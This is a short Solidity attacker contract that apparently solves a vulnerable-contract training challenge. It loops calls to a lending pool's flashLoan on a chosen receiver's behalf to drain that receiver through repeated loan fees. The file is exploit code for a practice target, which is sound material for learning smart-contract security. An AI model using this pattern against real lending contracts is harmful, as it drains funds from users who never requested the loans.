// SPDX-License-Identifier: MIT

pragma solidity 0.8.16;

import {NaiveReceiverLenderPool} from "./NaiveReceiverLenderPool.sol";

contract AtackerContract {
    NaiveReceiverLenderPool private pool;

    constructor(address _pool) {
        pool = NaiveReceiverLenderPool(payable(_pool));
    }

    function attack(address _receiver, uint256 _times) external {
        for (uint256 index = 0; index < _times; index++) {
            pool.flashLoan(_receiver, 100 ether);
        }
    }
}
